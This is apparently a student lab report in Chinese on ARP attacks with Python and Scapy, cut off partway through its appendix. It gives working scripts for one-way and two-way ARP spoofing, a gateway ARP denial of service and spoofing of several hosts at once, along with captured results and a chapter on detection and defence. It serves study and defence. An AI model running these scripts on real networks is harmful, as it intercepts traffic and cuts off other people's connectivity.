# -Python-ARP-
基于Python的ARP攻击的实现


《智能计算与信息安全综合实验》
研究报告
题    目：  基于Python的ARP攻击的实现                                    
专    业：  信息与计算科学                
                 



 
 
目    录
目    录	I
第一章 概述	1
1.1 研究工作的背景	1
1.2 研究工作的意义	1
1.3 各章节内容安排	1
第二章 相关背景知识介绍	3
2.1 IP地址和MAC地址简介	3
2.1.1 IP地址	3
2.1.2 MAC地址	3
2.2 ARP 及其攻击原理分析	4
2.2.1 ARP工作过程简介	4
2.2.2 ARP攻击原理分析	5
第三章 ARP攻击测试环境构建	7
3.1 实验设备与软件环境	7
3.2 网络拓扑结构	9
第四章 基于PYTHON的ARP攻击实现	10
4.1 总体设计	10
4.2 PYTHON实现与结果分析	10
4.2.1单向ARP欺骗	11
4.2.2双向ARP欺骗	13
4.2.3网关ARP DOS	15
4.2.4组网测试	17
第五章 ARP攻击的检测与应对方法	21
5.1 ARP 缓存异常的检测方法 	21
5.2 ARP 攻击的应对方法	21
第六章 总结与展望	23
参 考 文 献	24
附    录	25

 
第一章 概述
1.1 研究工作的背景
计算机网络的迅猛发展和普及，改变了人们的工作与生活，但同时也给人们带来了新的隐患，网络安全事件层出不穷。在目前计算机网络运行与使用中，ARP攻击成为最为常见的问题[1]。自2005年首例ARP(ADDRESS  RESOLUTION  PROTOCO)病毒被发现起，到目前ARP病毒已经排在危害病毒的前五位，ARP病毒极大地威胁着计算机网络中用户的安全。
ARP攻击的危害很大，较简单的ARP攻击会使计算机网络掉线，重要数据的丢失或密码被盗窃，具体的表现状况如下：主机网络的网速时快时慢，非常不稳定，会导致网络的通讯质量不稳定；主机死机，主机容易出现IP冲突；会导致被攻击的主机通讯困难。较复杂的ARP攻击会使核心资料被盗或出现严重的死机情况，ARP攻击使得局域网中整个计算机网络上网的用户账户信息被盗，可能会被用于进行一些其他的非法活动，给计算机网络用户造成巨大的损失，所以ARP攻击导致很多不安全问题。
在此背景下，研究ARP攻击的形成机制与检测防御方法，不仅有助于理解网络安全威胁的本质，更能为实际网络防护提供可行的技术依据。本实验从ARP协议出发，使用网络抓包工具捕捉网络数据，在分析IP地址和MAC地址，以及ARP攻击原理的基础上，指出ARP协议的不安全因素，并讨可能的ARP攻击的检测及应对方法。 
1.2 研究工作的意义
本研究的意义主要体现在理论探索与实践应用两个层面。在理论层面，通过对ARP协议结构与运行机制的分析，可以揭示其在设计阶段所遗留的安全隐患，为网络协议的安全性改进提供参考；同时，结合对ARP攻击类型的归纳与行为特征的刻画，可为未来的入侵检测系统提供支持。
在实践层面，本实验基于真实的网络环境，通过PYTHON编程模拟ARP攻击过程，利用抓包工具对通信数据进行捕获与分析，验证ARP攻击的可行性与危害性。通过复现实验环境，不仅能够直观地观察攻击行为的全过程，也能进一步验证防御策略的有效性。这样的研究思路使理论分析与实验验证相互支撑，从而使研究成果更具现实指导价值。
ARP攻击虽然常见，但其危害范围往往被低估。对于网络管理员或信息安全从业者而言，了解其工作机理与防御原理，是维护局域网安全的基础。因此，本研究不仅是一项实验性探索，更是一次安全意识的提升与实践能力的训练。
1.3 各章节内容安排
第一章主要阐述本研究的背景与研究意义，并从网络安全的整体发展趋势出发，分析ARP攻击在当前网络环境中频发的原因及其潜在危害。
第二章介绍相关背景知识、计算机网络的基本结构、局域网的通信原理以及数据链路层中ARP协议的运行机制；剖析ARP请求与响应报文格式及其在通信过程中的角色，为后续ARP攻击原理研究与实验分析奠定理论基础。
第三章主要阐述实验环境的搭建，包括网络拓扑设计与实验工具配置，为后续实验提供基础。
第四章对ARP攻击的实现过程进行详细说明。
第五章对ARP攻击的结果进行评估，展示攻击行为及抓包数据分析。
第六章针对ARP攻击的检测与防御机制展开讨论。
第七章总结全文的主要研究内容与实验结论，归纳ARP攻击的实现规律及防御策略的有效性；在此基础上，反思研究中存在的局限性，并对未来网络安全防御体系的改进方向提出展望。例如，可结合机器学习算法对ARP攻击特征进行模式识别，实现自动化检测与预警，为构建更加安全可靠的局域网环境提供技术支撑。

 

第二章 相关背景知识介绍
2.1	IP地址和MAC地址简介
2.1.1	IP地址
IP地址为了确保网络上每台计算机间能够方便地进行相互间通信,TCP/IP协议(TRANSMISSION CONTROL PROTOCOL/INTERNET  PROTOCOL)规定用一串32位的二进制地址来标识相互通信的每台主机,这串32位的数字就是我们俗称每台计算机的IP地址。如图2-1所示，IP数据包由32位源IP地址和32位目的IP地址等构成，通过分析IP数据包可知发出该数据包的源主机和接收该数据包的目的主机。
 
图2-1  IP数据包的结构
2.1.2 MAC地址
所有可以联接到网络的计算机都必须要配置一块网卡,网卡上有一串地址,这串地址叫作物理地址(MAC地址)。如图2-2所示，TCP/IP四层模型的第二层中需要使用到MAC地址。网络层需要通过使用ARP协议，把IP地址转换成MAC地址，如此才能将数据包传递到数据链路层。如图2-3所示，MAC地址采用一串48位的二进制地址来标识相互通信的每台主机，有时为方便书写,会用六个字节的十六进制表示MAC地址,每两个字节间用冒号隔开。由生产商编号和设备编号这两部分构成MAC地址，生产商编号由前三个字节来表示, 设备编号由后三个字节来表示。
 
图2-2  TCP/IP五层网络体系结构

 
图2-3  MAC地址的构成

2.2	ARP 及其攻击原理分析
ARP 协议是工业互联网架构中通信层的核心协议之一，其核心功能是将网络层分配的 IP 地址解析为数据链路层的物理 MAC 地址。由于网络内传输的每一帧数据均需包含目标 MAC 地址，ARP 协议在通信过程中具有不可替代的作用。每台主机的 ARP 缓存表中都存储了一系列的<IP,MAC>对，以降低广播消息的冗余传输。该缓存表包含静态条目和动态条目。静态条目通过人工配置永久存储在缓存表中，即使系统重启也不会丢失。动态条目通过 ARP 协议动态学习生成，一般保存几分钟的时间，超时后自动删除。ARP 协议存在显著的安全缺陷。首先，ARP 协议的无状态性意味着它不验证请求和响应包的真实性，缺乏有效的身份认证机制，使得攻击者能够轻易伪造 ARP 数据包并插入网络。其次，动态条目易篡改，由于 ARP 协议将 IP 地址与 MAC 地址的映射动态存储在缓存中，攻击者可以通过伪造 ARP 响应包，向目标主机注入错误的 IP-MAC 映射关系，从而实现数据包的劫持或中断通信。最后，ARP 协议的广播特性使得 ARP 请求默认以广播方式发送，攻击者可以通过监听网络流量，捕获并篡改通信过程，进一步利用网络中的漏洞实施攻击。因此，ARP 协议的设计缺陷为众多攻击提供了可乘之机，尤其是在缺乏额外安全机制的网络环境中。
2.2.1 ARP工作过程简介
在局域网中,一台主机要和另外一台主机进行直接通信前就需要先判断与目的主机是否是同一个网段。例如图2-4所示，源主机先把目标主机的IP地址与自己的子网掩码进行“与”操作,以此判断目标主机与自己是否在同一网段(目标主机的IP地址为172.16.2.160，源主机的IP地址为172.16.34.10，源主机的子网掩码为255.255.0.0)。
 
图2-4 目标主机的IP地址与源主机的子网掩码进行“与”操作
如果是同一网段，那么要请求的是目的主机的MAC地址。并且在源主机的ARP缓冲区没有与目标IP地址相对应的物理地址(MAC地址)信息，则启用ARP协议工作。ARP基本功能就是通过目标计算机的IP地址,查询目标计算机的MAC地址。假设局域网内有两台主机A和B，当主机A需要与主机B进行通信时,  主机A首先利用ARP协议获得主机B的MAC地址,为后续进行通信做准备。现主机A已经知道主机B的IP地址且主机A需要与主机B进行通信，此时需要查询目标主机的MAC地址。图2-5所示，主机请求的是同一网段的目的主机的MAC地址。
 
图2-5 主机请求的是同一网段的目的主机的MAC地址
如果不同网段，那么要请求的是默认网关的MAC地址，在源主机的ARP缓冲区没有与默认网关的IP地址相对应的物理地址信息,则启用ARP协议工作。与源主机在同一网段中的其他所有主机都能收到ARP请求报文并能够对这个ARP请求报文进行分析,  默认网关发现报文中的目标IP地址与自己的IP地址相同,则它向源主机发送ARP响应报文[2]。通过以上ARP协议的工作原理的分析可以发现,ARP协议是建立在局域网中主机可以相互通信的基础之上,因而,ARP具有广播性、无连接性、无序性、无认证字段、无关性和动态性等一系列的安全漏洞[3]。因为这些安全问题的存在,所以利用ARP协议漏洞进行网络攻击是相对有效网络攻击方法,并且是比较难以预防的网络攻击方式。
2.2.2 ARP攻击原理分析
由于ARP协议并不会对报文信息的真实性进行校验,而且某主机没有发出ARP请求报文给其他任何主机的情况下，该主机同样可以接受任意主机发出的请求ARP报文的响应报文，并且该主机会更新自己的ARP缓存,把新的地址映射信息加入ARP高速缓存中。这种缺陷使得伪造别人的物理地址可以实现ARP攻击,进而使得破坏局域网安全通信成为一种可能。如图2-6所示，下面通过具体的例子来观察ARP攻击实现的具体过程：三台计算机连接到一台交换机。二层交换机的工作机制：交换机经过自动学习，将把它的端口号和主机的MAC地址建立对应关系。在此假设主机PC1的IP地址为IP1，MAC地址为MAC1；主机PC2的IP地址为IP2，MAC地址为MAC2；主机PC3的IP地址为IP3，MAC地址为MAC3。
 
图2-6  ARP攻击过程
在该网络中,假定主机PC1和主机PC2可以合法的进行通信，此时不合法的主机PC3就可以利用ARP攻击，窃听主机PC1和主机PC2的通信。过程如下：主机PC3伪装成主机PC2，主动给主机PC1发送ARP请求的响应包；数据包源IP地址为主机PC2的IP，源MAC地址为主机PC3的物理地址。目标MAC地址为主机PC1的物理地址。主机PC1接受主机PC3发出的请求ARP报文的响应报文，并且主机PC1刷新ARP高速缓存，最终主机PC1的ARP表存在主机PC3的MAC地址与主机PC2的IP地址存在映射。同理，主机PC3伪装成主机PC1，主动给主机PC2发送ARP请求的响应包；最终主机PC2的ARP表存在主机PC3的MAC地址与主机PC1的IP地址存在映射。此时不合法的主机PC3就可以利用ARP攻击。窃听主机PC1和主机PC3的通信。经过对ARP攻击原理的分析，我们能够发现ARP攻击比较容易实现。在这个例子中因为ARP攻击发生在局域网内，所以只有内部的机器才能够互相监听。对于本来就存在严重的安全漏洞的网络来说，ARP攻击是一个较为严重的安全隐患。如果攻击方入侵到局域网内的某台主机上,并行进行ARP攻击，如果ARP攻击成功。那么所有数据都将流经原本不应该流经的主机，将给网络造成更大的破坏。
 

第三章 ARP攻击测试环境构建
在宿主机安装虚拟化软件，使用 VMware Workstation Pro 或 VirtualBox 创建多台 Windows 虚拟机并将虚拟机网络设置为桥接模式，确保每台虚拟机都能获得局域网IP，可互相通信并且关闭过滤防火墙。
使用 ping 命令验证连通性，使用pip install scapy安装Python与Scapy库，在攻击机或宿主机安装 Wireshark，用于观察ARP广播、应答包及流量变化。先在虚拟机环境下验证代码正确性、ARP表变化，再组网验证断网与流量劫持效果。
3.1 实验设备与软件环境
类别	名称 / 配置	说明
主机设备	一台笔记本电脑 	安装虚拟机软件，作为实验主控端
虚拟机环境	VMware 	创建多台Windows虚拟机
攻击机	Windows 虚拟机 1（安装Python + Scapy）	用于发起ARP欺骗攻击
受害机	Windows和其他操作系统虚拟机	用于验证ARP缓存变化、网络断连现象
实际网络环境	手机热点（4G/5G）	作为真实局域网测试ARP攻击的环境
移动设备	Android热点机 	提供Wi-Fi
开发语言	Python 3.x	编写ARP欺骗脚本
主要库	Scapy	构造与发送ARP数据包
抓包工具	Wireshark	分析ARP交互及流量变化
辅助命令	arp、ping、ipconfig等	验证ARP表与网络连通性

首先使用Vmware安装两台win10虚拟机并让两台虚拟机使用桥接模式，如图3-1所示，都桥接至宿主机网络适配器上，保证设备在同一网络内。
 
  
图3-1 虚拟机桥接模式
接着依次在两台虚拟机内进行控制面板—网络和共享中心—选择以太网Ethernet—属性—IP协议版本4，如图3-2所示，指定DNS服务器和在同一网段下不相同的IP地址，并在攻击机上安装Python和Wireshark工具。
 
图3-2 虚拟机IP地址
因为两台虚拟机在同一网段内，但是不知道对方的地址，所以在实验开始前先让两台虚拟机互相Ping通，缓存对方的IP和对应的MAC地址。如图3-3所示，
受害机<IP,MAC>为192.168.73.12   00-0c-29-11-5e-68，
网关<IP,MAC>为192.168.73.79     16-26-95-5a-56-09
攻击机<IP,MAC>为192.168.73.150   00-0c-29-d1-5c-72。
 
图3-3 网关和各虚拟机<IP,MAC>地址
3.2 网络拓扑结构
如图3-4所示，所有虚拟机均部署在同一主机上，通过桥接模式（Bridged）接入同一局域网，模拟局域网攻击场景。
 
图3-4 虚拟机网络拓扑结构
① 攻击机与受害机均可互相 ping 通。
② 攻击机运行 Python 程序伪造 ARP 响应包。
③ 受害机通过 arp -a 命令可查看网关MAC变化。
 

第四章 基于Python的ARP攻击实现
本章基于Python与Scapy库实现了ARP攻击程序，从系统总体设计、实现流程、模块功能和代码实现等方面详细阐述了ARP欺骗的实现过程。通过该程序，为下一章的实验与结果分析提供基础支撑，整体代码见附录。
4.1	总体设计
基于Python语言实现ARP欺骗攻击，验证ARP协议在无认证机制下的安全漏洞，实现攻击机对受害机的ARP缓存篡改与通信中断，为后续防御机制验证提供可重现的攻击模型，，系统总体结构如图4-1所示。
 
图4-1 总体设计结构
4. 2 Python实现与结果分析
结合第二章的理论分析，利用Scapy库直接构造ARP报文，欺骗目标主机和网关，使双方ARP缓存被篡改，受害机将攻击机误认为网关，导致通信中断或流量中转。
攻击流程为：
① 设置攻击目标IP（受害机）与网关IP；② 获取受害机和网关的MAC地址；
③ 构造伪造的ARP响应包；④ 持续循环发送，维持欺骗状态；
⑤ 退出程序后恢复正常ARP绑定。
Scapy 是一个强大的交互式数据包处理工具，支持生成、发送、捕获和解析ARP、IP、TCP、UDP等多层协议包，本实验利用Scapy构造ARP应答，实现ARP单向、双向欺骗等功能，主要包含两个核心函数。
① get_mac() 用于主动发送 ARP 请求以解析目标主机的 MAC 地址；
from scapy.all import ARP, Ether, sendp, srp
def get_mac(ip):
    """发送ARP请求，获取目标MAC"""
    # 构造广播以太网帧 + ARP请求包，向目标IP询问其MAC地址
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2,       # 等待响应时间
        retry=2,         # 重试次数
        verbose=False
    )
    # 解析响应并提取MAC地址
    for s, r in ans:
        return r[Ether].src
    return None

② restore() 用于在实验结束后恢复受害机的 ARP 表项，防止网络异常。
def restore(dest_ip, src_ip):
    """恢复ARP缓存"""
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    if dest_mac and src_mac:
        # 构造正确的ARP响应包，恢复原始绑定关系
        packet = Ether(dst=dest_mac) / ARP(
            op=2,
            pdst=dest_ip,   # 被恢复目标IP
            psrc=src_ip,    # 正确的源IP
            hwsrc=src_mac,  # 正确的源MAC
            hwdst=dest_mac  # 目标MAC
        )
        # 连续发送5次确保恢复成功
        sendp(packet, count=5, verbose=False)
4.2.1 单向ARP欺骗
#核心函数
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        dst_mac = "ff:ff:ff:ff:ff:ff"
    else:
        dst_mac = target_mac
    packet = Ether(dst=dst_mac) / ARP(
        op=2,              # ARP Reply
        pdst=target_ip,    # 欺骗目标
        psrc=spoof_ip,     # 冒充的源（网关IP）
        hwdst=dst_mac
    )
    sendp(packet, iface=iface, verbose=False)
while True:
    spoof(victim_ip, gateway_ip)
    count += 1
    print(f"[{count}] 已发送ARP包 → {victim_ip}：伪装 {gateway_ip}")
    time.sleep(1)

在攻击机（192.168.73.150）上运行攻击代码后，受害虚拟机（192.168.73.12）因为arp表被投毒，无法正常上网
 
图4-2 受害机无法正常上网
这时查看受害机 ARP 缓存表，在受害机（192.168.73.12）上打开 CMD，输入：arp -a
 
图4-3 受害机ARP缓存
受害机上显示的 192.168.73.79 对应的 MAC 已变成攻击者的 MAC，证明 ARP 欺骗已生效。
在攻击机上打开 Wireshark，选择接口Ethernet，设置显示过滤器：arp or ip后观察 ARP 数据包如下图所示
 
图4-4 攻击机抓包ARP条目
可知攻击机（192.168.73.150）在假冒网关（192.168.73.79）。
抓取数据验证中间人流量，如果欺骗成功，受害机的流量将流经攻击机。
在 Wireshark 中用过滤器：ip.addr == 192.168.73.12。在攻击机上能看到受害机（192.168.73.12）访问外网或发往网关的数据包（比如 DNS、HTTP 请求），说明数据流已经经过攻击机，ARP欺骗成功。
 
图4-5 攻击机抓包到源地址为192.168.73.12的网络通信
在攻击机上停止脚本运行后，受害机网络恢复正常。
4.2.2 双向ARP欺骗
#核心函数
def spoof(target_ip, spoof_ip):
    """
    功能：构造并发送伪造的ARP应答，实现ARP欺骗。
    参数说明：target_ip : 欺骗目标（受害机或网关）
        spoof_ip  : 冒充的主机（网关或受害机）
    实现原理：构造一个 ARP Reply（op=2）数据包：告诉 target_ip ："我是 spoof_ip"
        - 并将攻击者自己的 MAC 地址作为 spoof_ip 对应的 MAC 返回。
        当 target_ip 接收该报文后，
        其 ARP 缓存会更新为：    spoof_ip → 攻击者MAC
        从而使数据包被错误地发送给攻击者。
    """
    target_mac = get_mac(target_ip) or "ff:ff:ff:ff:ff:ff"# 获取目标主机MAC（若未响应，则广播发送）
    # 构造伪造ARP应答包：欺骗目标主机
    packet = Ether(dst=target_mac) / ARP(
        op=2,               # 表示ARP应答（is-at）
        pdst=target_ip,     # 欺骗目标IP
        psrc=spoof_ip,      # 冒充的源IP
        hwdst=target_mac    # 目标MAC )
     sendp(packet, iface=iface, verbose=False)
while True:
        # 欺骗受害机，让它以为攻击机是网关
        spoof(victim_ip, gateway_ip)
        spoof(gateway_ip, victim_ip) # 欺骗网关，让它以为攻击机是受害机
        count += 1
        print(f"[{count}] 已发送双向ARP包：伪装 {gateway_ip}→{victim_ip} 与 {victim_ip}→{gateway_ip}")
        time.sleep(1)
欺骗受害机，让它以为攻击机是网关，欺骗网关，让它以为攻击机是受害机。运行攻击代码后，受害虚拟机（192.168.73.12）无法正常上网
 
图4-6 受害机上网情况和ARP缓存
在 192.168.73.12（受害机） 打开 CMD：输入arp -a
  192.168.73.79         00-0c-29-d1-5c-72     动态
  192.168.73.150        00-0c-29-d1-5c-72     动态
网关MAC地址变成攻击机地址，说明受害机对网关 的 ARP 欺骗成功
在 网关（192.168.73.79） 上执行：
  192.168.73.12         00-0c-29-d1-5c-72     动态
受害机对应的 MAC 变成攻击机的 MAC，说明网关→受害机 的 ARP 欺骗成功接着在在攻击机上打开 Wireshark，选择网络接口，显示过滤器 arp or ip.addr == 192.168.73.12如图4-7。
 
图4-7 攻击机上捕获的ARP消息
受害机到网关（Source: 192.168.73.12，Destination: 192.168.73.79）的流量内容DNS、HTTP、ICMP、TCP SYN等，先到攻击机。
 图4-8 受害机网络通信被捕获

网关到受害机的回包也经过攻击机，Source: 192.168.73.79，Destination: 192.168.73.12，同样先到攻击机 MAC，完整双向欺骗成功。
 
图4-9 攻击机捕获的网关到受害机的回包
在抓包工具过滤((arp && (arp.opcode == 2)) && (arp.src.proto_ipv4 == 192.168.73.79)) && (arp.dst.proto_ipv4 == 192.168.73.12)后，发现不断向 192.168.73.79 发送伪造的 ARP 回复，在网关发往 192.168.73.12 的流量里，包源 MAC 变成了攻击机(192.168.73.150)的 MAC(00-0c-29-d1-5c-72)，欺骗成功。
 
图4-10 网关发送的源MAC地址被修改
通过在受害机和网关分别使用 arp -a，发现对方 IP 对应的 MAC 地址被替换为攻击机 MAC；同时在攻击机 Wireshark 中捕获到受害机与网关的双向通信流量，证明 ARP 双向欺骗（MITM）成功。

4.2.3 网关ARP Dos
def arp_dos(target_ip, gateway_ip): #核心函数
    target_mac = get_mac(target_ip)
    if not target_mac:
        print("[!] 无法获取目标MAC")
        return
    count = 0
    print("=== ARP 网关拒绝服务攻击启动 ===")
    print(f"[+] 目标主机: {target_ip}")
    print(f"[+] 攻击网关: {gateway_ip}")
    print(f"[+] 使用接口: {iface}\n")
    while True:
        fake_mac = "02:00:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255))
        pkt = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,
            psrc=gateway_ip,   # 网关 IP
            hwsrc=fake_mac,    # 假 MAC
            hwdst=target_mac  )
        sendp(pkt, iface=iface, verbose=False)
        count += 1
        print(f"[{count}] 伪造网关ARP → {gateway_ip} is-at {fake_mac}")
        time.sleep(1)

在 192.168.73.12（受害机） 上反复执行：arp -a
正常情况下arp表内网关为：
  192.168.73.79         16-26-95-5a-56-09     动态
在攻击机上执行ARP 网关 DoS 时，受害机因为网关mac地址被替换，无法正常上网。
 
图4-11 受害机ARP缓存内网关MAC被多次随机替换
此时在受害机上执行 arp -a：
  192.168.73.79         02-00-d6-92-e8-5d     动态
再次执行 arp -a：
  192.168.73.79         02-00-d6-92-e8-5d     动态
发现同一个网关 IP，MAC 每次都不一样，说明网关ARP DoS成功。
在目标机上验证“拒绝服务”是否成立
输入ping 192.168.73.79
 
图4-12 受害机无法稳定访问网关

发现目标机无法稳定访问网关 / 外网 。
在目标机上抓包，打开 Wireshark发现ARP 占比异常高，明显高于正常网络环境
Sender MAC 每个包都不同，Sender IP 始终是网关 IP。
 
4-13 发送IP相同但是源MAC不同
停止脚本后，在目标机上执行：ping 192.168.73.79后显示网络恢复，ARP 表重新学习到真实网关 MAC，说明问题确实由 ARP DoS 导致。
在攻击过程中，目标主机 ARP 缓存中网关 IP 对应的 MAC 地址频繁变化，导致目标主机无法正确解析网关，出现严重丢包甚至无法访问外网；通过 Wireshark 抓包发现大量伪造的 ARP Reply，说明目标主机遭受了 ARP 网关拒绝服务攻击。
4.2.4 组网测试
victim_ips = [
    "192.168.73.89",#计算机A
    "192.168.73.55"#计算机B
]# 受害机

while True:
    for vip in victim_ips:
        spoof(vip, gateway_ip)
        count += 1
        print(f"[{count}] 已发送ARP包 → {vip}：伪装 {gateway_ip}")
    time.sleep(1)


攻击机和电脑A、电脑B互相ping通
 
4-14 攻击机的ARP缓存
攻击机运行攻击脚本后：
 
图4-15电脑A的arp表
 
图4-16电脑B的arp表

在 两台受害机 上分别执行：arp -a。发现两台主机中网关 IP → 同一个攻击机 MAC，实验表明，ARP 欺骗可同时影响同一广播域内的多台主机。
Ping命令超时、丢包、延迟升高、有时完全不通（因为攻击机没转发），ARP 欺骗导致受害机无法正确访问网关，网络连通性受到影响。
 
图4-17 受害机A、B的网络通信收到影响

在两电脑上抓包，发现大量如下数据包并且源 IP 始终是网关 IP，源MAC 不是网关真实 MAC，说明ARP Reply 伪装网关。
电脑A抓包：
 
电脑B抓包：
 
图4-18 发往电脑A、B数据包的网关MAC被替换

在攻击机上用 Wireshark 抓包：过滤器arp，发现攻击机不断发送ARP Reply: 192.168.73.79 is-at 攻击机06-D3-B0-F6-80-97。
 
 
图4-19 攻击机伪造网关MAC地址

说明攻击行为确实发生，ARP Reply 是主动伪造的，停止攻击并恢复 ARP 表后，网络通信恢复，证明异常由 ARP 欺骗导致。

电脑A恢复ARP表：
 
电脑B恢复ARP表：
 
图4-20 攻击结束后电脑A、B的ARP表内容
 


第五章 ARP攻击的检测与应对方法
5.1	ARP 缓存异常的检测方法

（1）基于 ARP 缓存异常的检测方法
ARP 攻击往往会导致主机 ARP 缓存表出现异常变化，主要表现为：
同一 IP 地址对应多个 MAC 地址、ARP 表条目频繁更新、ARP 表中出现大量无效或随机地址。通过定期监控主机 ARP 缓存状态，可以发现潜在攻击行为。例如，在短时间内多次观察到网关 IP 对应的 MAC 地址发生变化，通常意味着存在 ARP 欺骗或 ARP DoS 攻击。该方法实现简单，适合在终端主机侧进行初步检测，但对自动化攻击的识别能力有限。

（2）基于网络流量特征的检测方法
ARP 攻击在网络中会产生明显的流量特征：
ARP Reply 报文数量异常增多、单位时间内大量 ARP 响应包、ARP 报文占网络总流量比例显著升高。通过抓包工具（如 Wireshark）或流量分析系统，对 ARP 数据包进行统计分析，可以识别异常行为。当 ARP 流量远高于正常网络基线时，可判定存在 ARP 攻击风险。该方法直观有效，常用于实验分析和安全审计。

（3） 基于一致性校验的检测方法
在正常网络环境中，IP–MAC 映射关系具有稳定性。ARP 攻击通常会破坏这种一致性，例如：网关 IP 被映射为非网关 MAC、同一 MAC 同时声明多个 IP、通过维护可信 IP–MAC 映射表，并对接收到的 ARP 响应进行校验，可以检测异常映射关系。这种方法常用于入侵检测系统（IDS）和交换机级安全模块中。

（4）基于主机行为异常的检测方法
ARP 攻击往往会导致网络服务异常，具体表现为：
网络延迟显著增加、丢包率升高、访问外网不稳定或完全中断。结合主机网络性能指标（如延迟、吞吐量、连接成功率），可以从行为层面辅助判断是否存在 ARP 攻击。
5.2	ARP攻击的应对方法
（1） 静态 ARP 绑定机制
通过手动配置静态 ARP 表项，将关键设备（如网关、服务器）的 IP 地址与 MAC 地址进行绑定，可有效防止 ARP 欺骗，实现简单，对 ARP 欺骗和网关 DoS 攻击具有较强防护能力。但是管理成本高，不适用于大规模动态网络环境。
在受害机执行arp -s 192.168.73.79 绑定真实网关MAC，攻击后网关 MAC 不再变化。
 192.168.73.79         16-26-95-5a-56-09     静态

（2） 动态 ARP 检测（DAI）
动态 ARP 检测（Dynamic ARP Inspection）是一种部署在交换机上的安全机制，其工作原理包括：
对 ARP 报文进行合法性校验、验证 IP–MAC 映射是否与 DHCP Snooping 表一致、丢弃非法或伪造的 ARP 报，DAI 能够在网络层面阻断 ARP 攻击，是企业级网络中常用的防护手段。

（3）DHCP Snooping 机制
DHCP Snooping 通过维护合法主机的 IP–MAC–端口绑定表，为 ARP 检测提供可信数据来源。结合 DAI 使用，可显著提高 ARP 攻击防御能力。

（4） 入侵检测与告警机制
将 ARP 攻击检测规则集成至入侵检测系统（IDS）中，可以实现：实时监测 ARP 异常行为、自动告警、与防火墙或交换机联动进行阻断，该方法适合对安全要求较高的网络环境。

（5）网络分段与最小化信任原则
通过 VLAN 划分、网络隔离等手段，可以限制 ARP 攻击的影响范围，避免攻击在整个局域网内扩散。这种策略符合“最小权限原则”，在实际网络设计中具有重要意义。

（6）清空 ARP 缓存
在攻击结束后，清除被污染的 ARP 表。
输入 arp -d *或 Linux：sudo ip neigh flush all
 

第六章 总结与展望
当前，计算机网络已成为人们日常工作生活的重要基础。本实验基于 Scapy 库，围绕 ARP 协议的工作机制与安全缺陷，系统性地实现并分析了多种 ARP 攻击方式并进行组网测试，ARP 协议由于缺乏身份认证与完整性校验机制，极易受到伪造 ARP 报文的影响，攻击成本低、隐蔽性强，具有较高的安全风险。尽管实验较为完整，但仍存在一定局限性，攻击效果主要停留在 ARP 层面，对上层协议（如 HTTP、HTTPS、DNS）的安全影响分析不够深入，未对现有防御机制进行深度测试，仅从攻击角度分析了 ARP 的安全问题。在后续研究与实验中1还可分析其在不同网络环境下的防护效果与局限性。在包含多网段、交换机和 VLAN 的环境中验证 ARP 攻击的可行性与传播范围，更贴近真实网络场景等复杂网络环境实验方面进一步拓展与深化。通过本次实验深入理解了 ARP 协议在设计层面存在的安全隐患，实验结果表明，局域网内部的安全防护同样至关重要。未来结合攻击与防御的双重视角进行研究，将有助于提升对网络安全问题的认识与实践能力。
 

参 考 文 献

[1]	程月琪.基于时空图神经网络的工业互联网ARP攻击检测方法研究[D].东华大学,   2025.
[2]	姚小兵.ARP协议简析及ARP病毒攻击的防御[J].信息网络安全,2009,(09):49-50+55.
[3]	沈涛.基于入侵检测的网络安全研究[D].   重庆大学,   2012.
				
				
备注：
　1、成绩自凭栏可选填：A+、A、A-、B+、B、B-、C+、C、C-、D、F


附录2：完整代码
一、单向欺骗
from scapy.all import ARP, Ether, sendp, srp, conf, get_if_list
import time
victim_ip = "192.168.73.12"   # 受害机
gateway_ip = "192.168.73.79"  # 网关
# 检测可用接口
iface = None
for i in get_if_list():
    if "VMnet" in i or "Ethernet" in i or "eth" in i:
        iface = i
        break
if not iface:
    iface = conf.iface  # 默认接口
def get_mac(ip):
    """发送ARP请求，获取目标MAC"""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2,
        retry=2,
        iface=iface,
        verbose=False
    )
    for s, r in ans:
        return r[Ether].src
    return None
def spoof(target_ip, spoof_ip):
    """单向欺骗受害机"""
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] 未能解析 {target_ip} 的MAC地址，使用广播发送。")
        dst_mac = "ff:ff:ff:ff:ff:ff"
    else:
        dst_mac = target_mac
    packet = Ether(dst=dst_mac) / ARP(
        op=2,              # is-at
        pdst=target_ip,    # 欺骗目标
        psrc=spoof_ip,     # 冒充源
        hwdst=dst_mac
    )
    sendp(packet, iface=iface, verbose=False)
def restore(dest_ip, src_ip):
    """恢复ARP缓存"""
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    if dest_mac and src_mac:
        packet = Ether(dst=dest_mac) / ARP(
            op=2,
            pdst=dest_ip,
            psrc=src_ip,
            hwsrc=src_mac,
            hwdst=dest_mac
        )
        sendp(packet, iface=iface, count=5, verbose=False)
try:
    # 打印启动信息
    attacker_ip = conf.route.route("0.0.0.0")[1]
    attacker_mac = get_mac(attacker_ip)
    victim_mac = get_mac(victim_ip)
    print("=== ARP 单向欺骗启动 ===")
    print(f"[+] 使用网卡接口: {iface}")
    print(f"[+] 攻击机 IP: {attacker_ip}")
    print(f"[+] 攻击机 MAC: {attacker_mac}")
    print(f"[+] 受害机 IP: {victim_ip}")
    print(f"[+] 受害机 MAC: {victim_mac}")
    print(f"[+] 网关 IP: {gateway_ip}")
    print("\n[*] 开始ARP单向欺骗，只伪装网关给受害机...\n")
    count = 0
    while True:
        spoof(victim_ip, gateway_ip)
        count += 1
        print(f"[{count}] 已发送ARP包 → {victim_ip}：伪装 {gateway_ip}")
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[!] 停止欺骗，正在恢复ARP表...")
    restore(victim_ip, gateway_ip)
    print("[*] 网络恢复完成。")

二、双向欺骗
from scapy.all import ARP, Ether, sendp, srp, conf, get_if_list
import time
victim_ip = "192.168.73.12"    # 受害机
gateway_ip = "192.168.73.79"   # 网关
# 自动检测可用接口（优先选择带有“VMnet”或“Ethernet”的接口）
iface = None
for i in get_if_list():
    if "VMnet" in i or "Ethernet" in i or "eth" in i:
        iface = i
        break
if not iface:
